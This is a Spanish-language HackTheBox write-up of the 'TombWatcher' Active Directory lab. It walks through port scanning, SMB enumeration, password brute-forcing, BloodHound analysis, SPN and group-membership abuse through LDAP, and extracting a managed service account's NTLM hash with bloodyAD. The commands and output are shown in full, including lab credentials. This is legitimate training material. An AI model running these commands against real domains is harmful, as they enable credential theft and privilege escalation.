---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# TombWatcher HackTheBox (Intermediate)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-10 07:02 EDT
Nmap scan report for 10.10.11.72
Host is up (0.032s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-10 15:02:31Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-10T15:04:02+00:00; +4h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2025-10-10T14:24:24
|_Not valid after:  2026-10-10T14:24:24
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-10T15:04:01+00:00; +4h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2025-10-10T14:24:24
|_Not valid after:  2026-10-10T14:24:24
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2025-10-10T14:24:24
|_Not valid after:  2026-10-10T14:24:24
|_ssl-date: 2025-10-10T15:04:02+00:00; +4h00m01s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2025-10-10T14:24:24
|_Not valid after:  2026-10-10T14:24:24
|_ssl-date: 2025-10-10T15:04:01+00:00; +4h00m01s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49540/tcp open  msrpc         Microsoft Windows RPC
49574/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h00m00s, deviation: 0s, median: 4h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-10T15:03:22
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.44 seconds
```

Veremos varios puertos interesantes, entre ellos el puerto `80` que aloja una pagina web, vamos a entrar dentro de la misma a ver que nos encontramos, pero antes como vemos en el reporte nos veremos un `dominio` de `AD` llamado `tombwatcher.htb` y `DC01.tombwatcher.htb` del `Domain Controller` por lo que vamos añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>             tombwatcher.htb DC01.tombwatcher.htb
```

Lo guardamos y entramos en la pagina de esta forma:

```
URL = http://<IP>/
```

Veremos un `IIS` normal de web nada interesante, vamos a realizar un `fuzzing` por `SMB` y en concreto vamos a utilizar las credenciales que nos proporcionan en `HTB`:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-10 130221.png" alt=""><figcaption></figcaption></figure>

Veremos que son:

```
User: henry
Pass: H3nry_987TGV!
```

## SMB

Vamos a probar a `enumerar` el puerto `SMB` a ver que vemos con dichas credenciales:

```shell
enum4linux -a -u henry -p 'H3nry_987TGV!' <IP>
```

Info:

```
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Oct 10 07:10:09 2025

 =========================================( Target Information )=========================================
                                                                                                                                                             
Target ........... 10.10.11.72                                                                                                                               
RID Range ........ 500-550,1000-1050
Username ......... 'henry'
Password ......... 'H3nry_987TGV!'
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.11.72 )============================
                                                                                                                                                             
                                                                                                                                                             
[E] Can't find workgroup/domain                                                                                                                              
                                                                                                                                                             
                                                                                                                                                             

 ================================( Nbtstat Information for 10.10.11.72 )================================
                                                                                                                                                             
Looking up status of 10.10.11.72                                                                                                                             
No reply from 10.10.11.72

 ====================================( Session Check on 10.10.11.72 )====================================
                                                                                                                                                             
                                                                                                                                                             
[+] Server 10.10.11.72 allows sessions using username 'henry', password 'H3nry_987TGV!'                                                                      
                                                                                                                                                             
                                                                                                                                                             
 =================================( Getting domain SID for 10.10.11.72 )=================================
                                                                                                                                                             
Domain Name: TOMBWATCHER                                                                                                                                     
Domain Sid: S-1-5-21-1392491010-1358638721-2126982587

[+] Host is part of a domain (not a workgroup)                                                                                                               
                                                                                                                                                             
                                                                                                                                                             
 ===================================( OS information on 10.10.11.72 )===================================
                                                                                                                                                             
                                                                                                                                                             
[E] Can't get OS info with smbclient                                                                                                                         
                                                                                                                                                             
                                                                                                                                                             
[+] Got OS info for 10.10.11.72 from srvinfo:                                                                                                                
        10.10.11.72    Wk Sv PDC Tim NT                                                                                                                      
        platform_id     :       500
        os version      :       10.0
        server type     :       0x80102b


 ========================================( Users on 10.10.11.72 )========================================
                                                                                                                                                             
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain                 
index: 0xfaf RID: 0x450 acb: 0x00000210 Account: Alfred Name: (null)    Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xfae RID: 0x44f acb: 0x00000210 Account: Henry  Name: (null)    Desc: (null)
index: 0xfb1 RID: 0x452 acb: 0x00000210 Account: john   Name: (null)    Desc: (null)
index: 0xf10 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xfb0 RID: 0x451 acb: 0x00000210 Account: sam    Name: (null)    Desc: (null)

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[Henry] rid:[0x44f]
user:[Alfred] rid:[0x450]
user:[sam] rid:[0x451]
user:[john] rid:[0x452]

 ==================================( Share Enumeration on 10.10.11.72 )==================================
                                                                                                                                                             
do_connect: Connection to 10.10.11.72 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                                       

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.11.72                                                                                                                  
                                                                                                                                                             
//10.10.11.72/ADMIN$    Mapping: DENIED Listing: N/A Writing: N/A                                                                                            
//10.10.11.72/C$        Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                                                                                               
                                                                                                                                                             
NT_STATUS_NO_SUCH_FILE listing \*                                                                                                                            
//10.10.11.72/IPC$      Mapping: N/A Listing: N/A Writing: N/A
//10.10.11.72/NETLOGON  Mapping: OK Listing: OK Writing: N/A
//10.10.11.72/SYSVOL    Mapping: OK Listing: OK Writing: N/A

 ============================( Password Policy Information for 10.10.11.72 )============================
                                                                                                                                                             
                                                                                                                                                             

[+] Attaching to 10.10.11.72 using henry:H3nry_987TGV!

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.11.72)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] TOMBWATCHER
        [+] Builtin

[+] Password Info for Domain: TOMBWATCHER

        [+] Minimum password length: 1
        [+] Password history length: 24
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:                                                                                                         
                                                                                                                                                             
                                                                                                                                                             
Password Complexity: Disabled                                                                                                                                
Minimum Password Length: 1


 =======================================( Groups on 10.10.11.72 )=======================================
                                                                                                                                                             
                                                                                                                                                             
[+] Getting builtin groups:                                                                                                                                  
                                                                                                                                                             
group:[Server Operators] rid:[0x225]                                                                                                                         
group:[Account Operators] rid:[0x224]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[Storage Replica Administrators] rid:[0x246]

[+]  Getting builtin group memberships:                                                                                                                      
                                                                                                                                                             
Group: Windows Authorization Access Group' (RID: 560) has member: NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS                                                 
Group: Administrators' (RID: 544) has member: TOMBWATCHER\Administrator
Group: Administrators' (RID: 544) has member: TOMBWATCHER\Enterprise Admins
Group: Administrators' (RID: 544) has member: TOMBWATCHER\Domain Admins
Group: Users' (RID: 545) has member: TOMBWATCHER\Administrator
Group: Users' (RID: 545) has member: NT AUTHORITY\INTERACTIVE
Group: Users' (RID: 545) has member: NT AUTHORITY\Authenticated Users
Group: Users' (RID: 545) has member: TOMBWATCHER\Domain Users
Group: Remote Management Users' (RID: 580) has member: TOMBWATCHER\john
Group: Pre-Windows 2000 Compatible Access' (RID: 554) has member: NT AUTHORITY\Authenticated Users
Group: Pre-Windows 2000 Compatible Access' (RID: 554) has member: TOMBWATCHER\DC01$
Group: Certificate Service DCOM Access' (RID: 574) has member: NT AUTHORITY\Authenticated Users
Group: Guests' (RID: 546) has member: TOMBWATCHER\Guest
Group: Guests' (RID: 546) has member: TOMBWATCHER\Domain Guests

[+]  Getting local groups:                                                                                                                                   
                                                                                                                                                             
group:[Cert Publishers] rid:[0x205]                                                                                                                          
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]

[+]  Getting local group memberships:                                                                                                                        
                                                                                                                                                             
Group: Cert Publishers' (RID: 517) has member: TOMBWATCHER\DC01$                                                                                             
Group: Denied RODC Password Replication Group' (RID: 572) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE

[+]  Getting domain groups:                                                                                                                                  
                                                                                                                                                             
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]                                                                                                  
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Infrastructure] rid:[0x453]

[+]  Getting domain group memberships:                                                                                                                       
                                                                                                                                                             
Group: 'Schema Admins' (RID: 518) has member: TOMBWATCHER\Administrator                                                                                      
Group: 'Domain Guests' (RID: 514) has member: TOMBWATCHER\Guest
Group: 'Domain Admins' (RID: 512) has member: TOMBWATCHER\Administrator
Group: 'Domain Users' (RID: 513) has member: TOMBWATCHER\Administrator
Group: 'Domain Users' (RID: 513) has member: TOMBWATCHER\krbtgt
Group: 'Domain Users' (RID: 513) has member: TOMBWATCHER\Henry
Group: 'Domain Users' (RID: 513) has member: TOMBWATCHER\Alfred
Group: 'Domain Users' (RID: 513) has member: TOMBWATCHER\sam
Group: 'Domain Users' (RID: 513) has member: TOMBWATCHER\john
Group: 'Enterprise Admins' (RID: 519) has member: TOMBWATCHER\Administrator
Group: 'Domain Controllers' (RID: 516) has member: TOMBWATCHER\DC01$
Group: 'Domain Computers' (RID: 515) has member: TOMBWATCHER\ansible_dev$
Group: 'Group Policy Creator Owners' (RID: 520) has member: TOMBWATCHER\Administrator

 ===================( Users on 10.10.11.72 via RID cycling (RIDS: 500-550,1000-1050) )===================
                                                                                                                                                             
                                                                                                                                                             
[I] Found new SID:                                                                                                                                           
S-1-5-21-1392491010-1358638721-2126982587                                                                                                                    

[I] Found new SID:                                                                                                                                           
S-1-5-21-1392491010-1358638721-2126982587                                                                                                                    

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[+] Enumerating users using SID S-1-5-21-1392491010-1358638721-2126982587 and logon username 'henry', password 'H3nry_987TGV!'                               
                                                                                                                                                             
S-1-5-21-1392491010-1358638721-2126982587-500 TOMBWATCHER\Administrator (Local User)                                                                         
S-1-5-21-1392491010-1358638721-2126982587-501 TOMBWATCHER\Guest (Local User)
S-1-5-21-1392491010-1358638721-2126982587-502 TOMBWATCHER\krbtgt (Local User)
S-1-5-21-1392491010-1358638721-2126982587-512 TOMBWATCHER\Domain Admins (Domain Group)
S-1-5-21-1392491010-1358638721-2126982587-513 TOMBWATCHER\Domain Users (Domain Group)
S-1-5-21-1392491010-1358638721-2126982587-514 TOMBWATCHER\Domain Guests (Domain Group)
S-1-5-21-1392491010-1358638721-2126982587-515 TOMBWATCHER\Domain Computers (Domain Group)
S-1-5-21-1392491010-1358638721-2126982587-516 TOMBWATCHER\Domain Controllers (Domain Group)
S-1-5-21-1392491010-1358638721-2126982587-517 TOMBWATCHER\Cert Publishers (Local Group)
S-1-5-21-1392491010-1358638721-2126982587-518 TOMBWATCHER\Schema Admins (Domain Group)
S-1-5-21-1392491010-1358638721-2126982587-519 TOMBWATCHER\Enterprise Admins (Domain Group)
S-1-5-21-1392491010-1358638721-2126982587-520 TOMBWATCHER\Group Policy Creator Owners (Domain Group)
S-1-5-21-1392491010-1358638721-2126982587-521 TOMBWATCHER\Read-only Domain Controllers (Domain Group)
S-1-5-21-1392491010-1358638721-2126982587-522 TOMBWATCHER\Cloneable Domain Controllers (Domain Group)
S-1-5-21-1392491010-1358638721-2126982587-525 TOMBWATCHER\Protected Users (Domain Group)
S-1-5-21-1392491010-1358638721-2126982587-526 TOMBWATCHER\Key Admins (Domain Group)
S-1-5-21-1392491010-1358638721-2126982587-527 TOMBWATCHER\Enterprise Key Admins (Domain Group)
S-1-5-21-1392491010-1358638721-2126982587-1000 TOMBWATCHER\DC01$ (Local User)

[+] Enumerating users using SID S-1-5-90 and logon username 'henry', password 'H3nry_987TGV!' 

[+] Enumerating users using SID S-1-5-21-2729675972-3892313149-4080990915 and logon username 'henry', password 'H3nry_987TGV!'                               
                                                                                                                                                             
S-1-5-21-2729675972-3892313149-4080990915-500 DC01\Administrator (Local User)                                                                                
S-1-5-21-2729675972-3892313149-4080990915-501 DC01\Guest (Local User)
S-1-5-21-2729675972-3892313149-4080990915-503 DC01\DefaultAccount (Local User)
S-1-5-21-2729675972-3892313149-4080990915-504 DC01\WDAGUtilityAccount (Local User)
S-1-5-21-2729675972-3892313149-4080990915-513 DC01\None (Domain Group)

[+] Enumerating users using SID S-1-5-32 and logon username 'henry', password 'H3nry_987TGV!'                                                                
                                                                                                                                                             
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                            
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-5-80-3139157870-2983391045-3678747466-658725712 and logon username 'henry', password 'H3nry_987TGV!'                     
                                                                                                                                                             
                                                                                                                                                             
[+] Enumerating users using SID S-1-5-82-3006700770-424185619-1745488364-794895919 and logon username 'henry', password 'H3nry_987TGV!'                      
                                                                                                                                                             
                                                                                                                                                             
[+] Enumerating users using SID S-1-5-82-3876422241-1344743610-1729199087-774402673 and logon username 'henry', password 'H3nry_987TGV!'                     
                                                                                                                                                             
                                                                                                                                                             
[+] Enumerating users using SID S-1-5-80 and logon username 'henry', password 'H3nry_987TGV!'                                                                
                                                                                                                                                             
                                                                                                                                                             
[+] Enumerating users using SID S-1-5-82-271721585-897601226-2024613209-625570482 and logon username 'henry', password 'H3nry_987TGV!'                       
                                                                                                                                                             
                                                                                                                                                             
 ================================( Getting printer info for 10.10.11.72 )================================
                                                                                                                                                             
do_cmd: Could not initialise spoolss. Error was NT_STATUS_OBJECT_NAME_NOT_FOUND                                                                              


enum4linux complete on Fri Oct 10 07:19:13 2025
```

Veremos informacion muy interesante entre ella veremos varios usuarios:

> users.txt

```
alfred
Alfred
sam
john
DC01
```

Veremos que `john` puede conectarse por `WinRM` es una opcion interesante, despues vemos que `DC01` puede publicar certificados y por ultimo vemos un grupo llamado `DnsAdmins` que esto puede tener una vulnerabilidad conocida.

## Netexec

Vamos a probar fuerza bruta por `SMB` con `netexec` con el listado de usuarios a ver si hay suerte.

```shell
netexec smb <IP> -u users.txt -p <WORDLIST> --ignore-pw-decoding
```

Info:

```
.................................<RESTO DE INFO>...................................
SMB     10.10.11.72     445    DC01   [+]    tombwatcher.htb\alfred:basketball
```

Veremos que hemos encontrado unas credenciales del usuario `alfred` vamos a ver que podemos hacer con este usuario.

## BloodHound

Vamos a descargarnos en un `ZIP` toda la info del `AD` con esta herramienta para pasarsela a `BloodHound` de esta forma:

```shell
bloodhound-python -u henry -p 'H3nry_987TGV!' -ns <IP> -d TOMBWATCHER.htb -c All --zip
```

Info:

```
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 00M 08S
INFO: Compressing output into 20251010075810_bloodhound.zip
```

Con esto veremos un `.zip` el cual contiene toda la info para pasarsela a `BloodHound` vamos a instalarnos dicha herramienta.

URL = [Download BloodHound en Docker](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)

```shell
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
./bloodhound-cli install
```

Info:

```
..............................<RESTO DE INFO>......................................
Container bloodhound-graph-db-1  Creating
 Container bloodhound-app-db-1  Creating
 Container bloodhound-graph-db-1  Created
 Container bloodhound-app-db-1  Created
 Container bloodhound-bloodhound-1  Creating
 Container bloodhound-bloodhound-1  Created
 Container bloodhound-app-db-1  Starting
 Container bloodhound-graph-db-1  Starting
 Container bloodhound-app-db-1  Started
 Container bloodhound-graph-db-1  Started
 Container bloodhound-graph-db-1  Waiting
 Container bloodhound-app-db-1  Waiting
 Container bloodhound-graph-db-1  Healthy
 Container bloodhound-app-db-1  Healthy
 Container bloodhound-bloodhound-1  Starting
 Container bloodhound-bloodhound-1  Started
[+] BloodHound is ready to go!
[+] You can log in as `admin` with this password: bnf8XsztC4Hypx6nMV5eSlhHpuDfEWgH
[+] You can get your admin password by running: bloodhound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login
```

Ahora que esta importado en nuestro `docker` y levantado podremos acceder a el desde la siguiente `URL`.

```
URL = http://127.0.0.1:8080/ui/login
```

Nos logueamos con las credenciales propocionadas por la herramienta:

```
User: admin
Pass: bnf8XsztC4Hypx6nMV5eSlhHpuDfEWgH
```

Una vez dentro vamos a importar el `.zip` y tendremos que esperar un poco a que cargue todos los datos, despues cuando vayamos al `dashboard` principal veremos todos los datos, vamos a investigar el usuario `henry` que puede tener con el usuario `alfred`, investigando un poco veremos lo siguiente:

<figure><img src="../../.gitbook/assets/bloodhound.png" alt=""><figcaption></figcaption></figure>

Veremos que tenemos los privilegios de `WriteSPN` sobre el usuario `alfred` por lo que podremos descargarnos un script ya configurado para ello y poder realizar la vulnerabilidad de esta forma:

> NOTA

Pero antes si queremos que se pare el contenedor o lo quisieramos levantar de nuevo, podemos hacer lo siguiente con el binario:

```shell
./bloodhound-cli down # Para parar el contenedor
./bloodhound-cli up # Para levantar de nuevo el contendor
```

Ahora siguiendo con la explotacion de dicha vulnerabilidad...

URL = [Download addspn.py](https://github.com/dirkjanm/krbrelayx)

```shell
git clone https://github.com/dirkjanm/krbrelayx.git
cd krbrelayx/
python3 addspn.py -u 'TOMBWATCHER.htb\henry' -p 'H3nry_987TGV!' -t 'alfred' -s 'http/alfred.tombwatcher.htb' <IP>
```

Info:

```
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

Veremos que ha funcionado, ahora si lo comprobamos de esta forma:

```shell
python3 addspn.py -u 'TOMBWATCHER.htb\henry' -p 'H3nry_987TGV!' -t 'alfred' -q <IP>
```

Info:

```
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
DN: CN=Alfred,CN=Users,DC=tombwatcher,DC=htb - STATUS: Read - READ TIME: 2025-10-10T15:31:46.511872
    sAMAccountName: Alfred
    servicePrincipalName: http/alfred.tombwatcher.htb
```

Veremos que se agrego de forma correcta, pero de momento no podremos hacer nada, por lo que vamos a seguir investigando en el `BloodHound` pero esta vez nos vamos a descargar con las credenciales del usuario `alfred`.

```shell
bloodhound-python -u alfred -p 'basketball' -ns <IP> -d TOMBWATCHER.htb -c All --zip
```

Info:

```
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 00M 07S
INFO: Compressing output into 20251011041041_bloodhound.zip
```

Ahora importaremos en `BloodHound` este nuevo archivo, investigando un poco veremos con el usuario `alfred` este privilegio.

## Escalate user john

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-11 101445.png" alt=""><figcaption></figcaption></figure>

Veremos que tenemos privilegios de `AddSelf` con el grupo `Infrastructure` y este grupo a la vez tiene este privilegio:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-11 101616.png" alt=""><figcaption></figcaption></figure>

Y ala vez `Ansible_devs$` tiene los privilegios siguientes respecto al usuario `sam`:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-11 101707.png" alt=""><figcaption></figcaption></figure>

Vemos que podremos cambiarle la contraseña desde dicho `"Equipo"`, tambien con este usuario veremos los privilegios bajo el usuario `john`.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-11 101838.png" alt=""><figcaption></figcaption></figure>

Vemos que tenemos el `WriteOwner` sobre el usuario `john` que es el que sabemos que se puede conectar por `WinRM`, por lo que toda esta escalada nos interesa bastante.

Ya por ultimo con este usuario `john` veremos estos privilegios super interesante respecto a los `ADCS`:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-11 102152.png" alt=""><figcaption></figcaption></figure>

Teniendo ya practicamente toda la escalada vista por encima vamos a ponerlo en practica de esta forma, empecemos primero con el privilegios de `AddSelf`.

```shell
cat > add_to_infra.ldif << EOF
dn: CN=Infrastructure,CN=Users,DC=tombwatcher,DC=htb
changetype: modify
add: member
member: CN=Alfred,CN=Users,DC=tombwatcher,DC=htb
EOF
ldapmodify -x -H ldap://<IP> -D 'alfred@TOMBWATCHER.htb' -w 'basketball' -f add_to_infra.ldif
```

Info:

```
modifying entry "CN=Infrastructure,CN=Users,DC=tombwatcher,DC=htb"
```

Veremos que ha funcionado, ahora vamos a comprobar si realmente se agrego a dicho grupo `alfred`:

```shell
ldapsearch -x -H ldap://<IP> -D 'alfred@TOMBWATCHER.htb' -w 'basketball' -b "CN=Infrastructure,CN=Users,DC=tombwatcher,DC=htb" member
```

Info:

```
# extended LDIF
#
# LDAPv3
# base <CN=Infrastructure,CN=Users,DC=tombwatcher,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: member 
#

# Infrastructure, Users, tombwatcher.htb
dn: CN=Infrastructure,CN=Users,DC=tombwatcher,DC=htb
member: CN=Alfred,CN=Users,DC=tombwatcher,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Veremos que si se agrego de forma correcta, ahora siendo de ese grupo recordemos que podemos leer el `hash` `NTLM` de dicho usuario.

Vamos a descargarnos un `script` el cual nos automatiza todo esto:

URL = [Download bloodyAD](https://github.com/CravateRouge/bloodyAD)

```shell
git clone https://github.com/CravateRouge/bloodyAD
cd bloodyAD/
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
python3 bloodyAD.py -d TOMBWATCHER.htb -u alfred -p basketball --host <IP> get object 'ANSIBLE_DEV$' --attr msDS-ManagedPassword
```

Info:

```
distinguishedName: CN=ansible_dev,CN=Managed Service Accounts,DC=tombwatcher,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:bf8b11e301f7ba3fdc616e5d4fa01c30
msDS-ManagedPassword.B64ENCODED: hTHfon3m4u5bkUTSlOKiTcVGqaIiYqe4SrrDZd8uUEmyGMin8X1qKy6L5ZHVlsvRp17h6l5hC0OqLxYV/WGcmmGom+hqBklNY+MSgPO2r8SUnGniBbV3VR2C6pak3TJxRHd+4yb8iNDsLLgEG/goJ8yVoaaYpQppZWEOtE9EvQLV0nYjWoReut1xHZ1QP/kmHL6hOGrASDo2FIgXRQmEzjyatED/Zdz7s3mfB3OuOWxQUiyd4tic2RFKHEjurhJXN8iuVh0jPJzyWqEiF+5+ZYDckA52ICoIN9JhyAxH3R6Ftqjok3Xc524zjHBiE3Fb7ZMBtNkjobLCxW3976E1yw==
```

